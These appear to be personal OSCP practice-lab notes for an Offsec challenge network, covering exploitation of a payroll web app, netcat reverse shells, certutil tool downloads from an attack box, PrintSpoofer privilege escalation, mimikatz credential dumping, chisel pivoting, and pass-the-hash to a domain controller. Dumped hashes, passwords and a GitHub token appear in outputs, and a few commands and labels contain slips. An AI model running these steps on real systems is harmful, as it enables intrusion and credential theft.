# Windows

## 192.168.238.141 - MS01
Challenge 4 - MS01 OS Credentials:
Target: 
```ini
192.168.238.141
```
### Prep

General Mind Map:
https://xmind.app/m/QsNUEz/


Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir OSCP-PracticeA && OSCP-PracticeA
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

My IP
```
192.168.45.174
```

Prep Rev Shells
https://revshells.com

### Recon

Start with a quick open port scan
```sh
rustscan 192.168.238.141
```
	22/tcp    open  ssh          syn-ack
	80/tcp    open  http         syn-ack
	81/tcp    open  hosts2-ns    syn-ack
	135/tcp   open  msrpc        syn-ack
	139/tcp   open  netbios-ssn  syn-ack
	445/tcp   open  microsoft-ds syn-ack
	5040/tcp  open  unknown      syn-ack
	5985/tcp  open  wsman        syn-ack
	47001/tcp open  winrm        syn-ack
	49664/tcp open  unknown      syn-ack
	49665/tcp open  unknown      syn-ack
	49666/tcp open  unknown      syn-ack
	49667/tcp open  unknown      syn-ack
	49668/tcp open  unknown      syn-ack
	49669/tcp open  unknown      syn-ack
	49670/tcp open  unknown      syn-ack

  
Quick OS check
	Offsec tells us it's Windows

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p 22,80,81,135,139,445,5040,5985 -v -T4 192.168.238.141 -oN services.nmap
```


### 81/tcp    open  hosts2-ns    syn-ack
Web page with the site title of attendance and payroll system

Google attendance and payroll system exploit

Found this: https://www.exploit-db.com/exploits/50801

Download and run. Delete the file path that doesn't exist in the code.

Runs successfully with a whoami as 
	ms01\mary.williams

Now to upgrade shell.

Will upload netcat to the windows host

```
sudo python3 -m http.server 80
```

Now on the windows host download the file from the attack box

```
certutil -urlcache -f http://192.168.45.174/nc64.exe nc.exe
```

Got a 200 code on the python server

Now to do a blind netcat reverse shell back to the attack box

```
nc.exe 192.168.45.174 4444 -e cmd.exe
```

Reverse shell into the windows host connected

now to check for privileges 

```
whoami -a
```

SeImpersonatePrivilege state is enabled

Now we want to upload the Print-Spoof exploit
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

Add to the tools folder where the python server is running

Download the print spoof exploit

```
certutil -urlcache -f http://192.168.45.174/PrintSpoofer64.exe ps.exe
```

Uploaded successfully

To prep to connect to another connection shell run nc (suggested to use 443 since it's never blocked by firewall in many networks)

```
nc -nlvp 443
```

Now to run the exploit to spawn a shell with a higher privilege level back on my system
```
ps.exe -c "nc.exe  192.168.45.174 443 -e cmd.exe"
```

After running this I see the system32 line in my reverse shell

```
whoami
```
	nt authority\system32

### Pivoting

Now to install mimikatz for further actions to pivot to other systems
https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe

Now download it with certutil
```
certutil -urlcache -f http://192.168.45.174/mimikatz.exe mimi.exe
```

After it downloads, pull up the mimikatz cheat sheet
https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49

Always debug when starting to confirm privileges
```mimikatz
privilege::debug
```
	Privilege '20' OK

This escalates Mimikatz privileges
```mimikatz
token::elevate
```
	Token Id  : 0
	User name : 
	SID name  : NT AUTHORITY\SYSTEM
	
	644	{0;000003e7} 1 D 43235     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
	 -> Impersonated !
	 * Process Token : {0;000003e7} 0 D 2351848   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,31p)	Primary
	 * Thread Token  : {0;000003e7} 1 D 2426310   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

Now to dump credentials:
```mimikatz
lsadump::sam
```
![[Pasted image 20231207164053.png]]
	RID  : 000001f4 (500)
	User : Administrator
	  Hash NTLM: 3c4495bbd678fac8c9d218be4f2bbc7b

```mimikatz
vault::cred
```
	No output

```mimikatz
sekurlsa::logonpasswords
```
		 * Username : celia.almeda
	 * Domain   : OSCP
	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd

We want plaintext passwords from this output if any
```mimikatz
lsadump::secrets
```
	cur/text: 7k8XHk3dMtmpnC7
	cur/text: 69jHwjGN2bPQFvJ

Checking for hashes of current users (Takes some time)
```mimikatz
lsadump::lsa /patch
```
	Nothing new

Now to exit mimikatz

Will now create text files for users, passwords, and hashes to prepare for password spraying

Users:
	celia.almeda
	Administrator
	mary.williams

Hashes:
	3c4495bbd678fac8c9d218be4f2bbc7b
	e728ecbadfb02f51ce8eed753f3ff3fd

Passwords:
	7k8XHk3dMtmpnC7
	69jHwjGN2bPQFvJ

In case of disconnect use impacket-psexec to reconnect
```sh
impacket-psexec Administrator@192.168.238.141 -hashes :3c4495bbd678fac8c9d218be4f2bbc7b
```

Now to tunnel from the Windows to the attack box via chisel since the other two IP addresses are internal
https://github.com/jpillora/chisel/releases/tag/v1.9.1

Run the server on the attack box
```
./chiselLin.sh server --port 4445 --reverse
```

Download Chisel for windows
```
certutil -urlcache -f http://192.168.45.174/chiselWin.exe chisel.exe
```

Run the client on the windows after installing it
```
chisel.exe client 192.168.45.174:4445 R:socks
```

Tunnel Created. Now to configure proxychains for the default port of Chisel which is 1060 
```ini
socks5 127.0.0.1 1080
```

Now to password spray via evil-winrm

Install if not present on system
```sh
sudo gem install evil-winrm
```


Now to connect to MS02

## 10.10.128.142 - MS02
Challenge 4 - MS02 OS Credentials:
Target: 
```ini
192.168.214.145
```

Password Spray manually as it's less than 5 to MS02 from users and passwords obtained from MS01

```
proxychains evil-winrm -i 10.10.128.142 -u celia.almeda -p 7k8XHk3dMtmpnC7
```

```
proxychains evil-winrm -i 10.10.128.142 -u celia.almeda -p 69jHwjGN2bPQFvJ
```

The first password works: `7k8XHk3dMtmpnC7`

```cmd
whoami
```
	oscp\celia.almeda

```
whoami /all
```
	No SeImpersination

Now to check for old windows
```
cd ..\..\..\..\
```

At root we see `windows.old`

```
cd windows.old
```

Now check for old passwords through manual enumeration since it's not the active windows system
```
cd C:\windows.old\Windows\System32>
```

Use Evil-winrm's `download` function to get `sam` and `system`
```
download sam
```
	|S-chain|-<>-127.0.0.1:1080-<><>-10.10.128.142:5985-<><>-OK
	|S-chain|-<>-127.0.0.1:1080-<><>-10.10.128.142:5985-<><>-OK
	                                        
	Info: Downloading C:\windows.old\Windows\System32\sam to sam
	                                        
	Info: Download successful!

System will take a bit longer
```
download system
```
	Info: Downloading C:\windows.old\Windows\System32\system to system

With these files downloaded we'll use impacket to dump credentials from it
```
impacket-secretsdump -system system -sam sam LOCAL
```
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
	
	[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
	tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
	Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
	David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
	Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
	[*] Cleaning up...


Usually users ending with `_admin` are domain admins via standard naming conventions

User: `tom_admin`
NTLM Hash: `4979d69d4ca66955c075c41cf45f24dc`


Using Evil-winrm we attempt to connect into Tom's account which we guess he's a domain admin of

```sh
proxychains evil-winrm -i 10.10.128.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
```
## 10.10.104.140 - Domain Controller
Challenge 4 - DC01 OS Credentials:
Target: 
```ini
10.10.128.140
```

Navigate to the Administrator's Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
	**07b3de5501ee660b3147972e46a3b0f**0
# Linux
## 192.168.214.143 - Aero
Challenge 4 - Aero OS Credentials:
Target: 
```ini
192.168.214.143
```
### Prep

General Mind Map:
https://xmind.app/m/QsNUEz/


Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir OSCP-PracticeA && OSCP-PracticeA
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

My IP
```
192.168.45.143
```

Prep Rev Shells
https://revshells.com

### Recon

Start with a quick open port scan
```sh
rustscan 192.168.214.143
```
	PORT     STATE SERVICE    REASON
	21/tcp   open  ftp        syn-ack
	22/tcp   open  ssh        syn-ack
	80/tcp   open  http       syn-ack
	81/tcp   open  hosts2-ns  syn-ack
	443/tcp  open  https      syn-ack
	3000/tcp open  ppp        syn-ack
	3001/tcp open  nessus     syn-ack
	3003/tcp open  cgms       syn-ack
	3306/tcp open  mysql      syn-ack
	5432/tcp open  postgresql syn-ack

Quick OS check
	Offsec tells us it's Linux

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p 21,22,80,81,443,3000,3001,3003,3306,5432 -v -T4 192.168.214.143 -oN services.nmap
```

### 21/tcp   open  ftp        vsftpd 3.0.3
### 22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 234c6fffb85229653dd14e38ebfe01c1 (RSA)
|   256 0dfd36d8056983efaea0fe4b820332ed (ECDSA)
|_  256 cc76171e8ec557b21f452809055aeb39 (ED25519)

### 80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```sh
gobuster dir -u http://192.168.45.143 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-big.txt -x php,html -t 20 -o gobuster-results.txt
```

### 81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```sh
gobuster dir -u http://192.168.45.143:81 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-big.txt -x php,html -t 20 -o gobuster-results.txt
```

### 3000/tcp open  ppp?

### 3001/tcp open  nessus?

### 3003/tcp open  cgms?

### 3306/tcp open  mysql      MySQL (unauthorized)

### 5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings:
|   SMBProgNeg:
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2113
|_    RProcessStartupPacket
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
2 services unrecognized despite returning data. If you know the service/version, please submit the following finger                          prints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3003-TCP:V=7.93%I=7%D=12/1%Time=656A6BCF%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.93%I=7%D=12/1%Time=656A6BCA%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
## Crystal
Challenge 4 - Crystal OS Credentials:
Target: 
```ini
192.168.214.144
```
### Prep

General Mind Map:
https://xmind.app/m/QsNUEz/

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir Linux-Crystal && Linux-Crystal
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

My IP
```
192.168.45.157
```

Prep Rev Shells
https://revshells.com

### Recon

Start with a quick open port scan
```sh
rustscan 192.168.214.144
```
	PORT   STATE SERVICE REASON
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

  
Quick OS check
	Offsec tells us it's Linux

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p 21,22,80 -v -T5 192.168.214.144 -oN services.nmap
```
### 21/tcp open  ftp     vsftpd 3.0.5

Anon test
```
ftp 192.168.187.144
```
	Connected to 192.168.187.144.
	220 (vsFTPd 3.0.5)
	Name (192.168.187.144:parrot): anonymous
	331 Please specify the password.
	Password:
	530 Login incorrect.
	Login failed.
	ftp> exit
	221 Goodbye.

### 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fbeae1182f1d7b5e75965a98df3d17e4 (ECDSA)
|_  256 66f454421f2516d7f3ebf7449f5a1a0b (ED25519)
### 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: Nicepage 4.21.12, nicepage.com
|_http-title: Home
| http-git: 
|   192.168.214.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```sh
sudo nmap -sV --script=http-title,http-enum,http-favicon,http-methods,http-passwd,http-robots.txt,http-sql-injection -p 80 -T5 192.168.187.144 -oN http.nmap
```
	| http-enum: 
	|   /.git/HEAD: Git folder
	|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	|_http-title: Home
	| http-methods: 
	|_  Supported Methods: POST OPTIONS HEAD GET



## 192.168.214.145 - Hermes
Challenge 4 - Hermes OS Credentials:
Target: 
```ini
192.168.214.145
```
### Prep

General Mind Map:
https://xmind.app/m/QsNUEz/

Confirm docker is installed and set rustscan as an alias or add to bashrc / fish config due to it being able to scan all ports and services in 10 seconds
```sh
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

Create directory for target and enter it
```sh
mkdir OSCP-PracticeA && OSCP-PracticeA
```

Prep a nc listener
```sh
nc -nlvp 4444
```

Confirm ip address
```sh
hostname -I
```

My IP
```ini
192.168.45.157
```

Prep Rev Shells
https://revshells.com

### Recon

Start with a quick open port scan
```sh
rustscan 192.168.214.145
```
	PORT     STATE SERVICE       REASON
	21/tcp   open  ftp           syn-ack
	80/tcp   open  http          syn-ack
	135/tcp  open  msrpc         syn-ack
	139/tcp  open  netbios-ssn   syn-ack
	445/tcp  open  microsoft-ds  syn-ack
	1978/tcp open  unisql        syn-ack
	3389/tcp open  ms-wbt-server syn-ack
  
Quick OS check
	Offsec tells us it's Linux

Follow up with a service scan on those open ports
```sh
sudo nmap -sC -sV -Pn -p 21,80,135,139,445,1978,3389 -v -T4 192.168.214.145 -oN services.nmap
```
### 21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
### 80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Samuel's Personal Site
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
### 135/tcp  open  msrpc         Microsoft Windows RPC

### 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

### 445/tcp  open  microsoft-ds?

### 1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
### 3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2023-12-01T22:52:17+00:00
| ssl-cert: Subject: commonName=oscp
| Issuer: commonName=oscp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-30T22:14:10
| Not valid after:  2024-05-31T22:14:10
| MD5:   b68071f4f6a381a79c75e8074ad993d2
|_SHA-1: e2cf7a9e54c4b17f682ee2c8fcf4b9714990a0ab
|_ssl-date: 2023-12-01T22:52:57+00:00; -1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.93%I=7%D=12/1%Time=656A6307%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
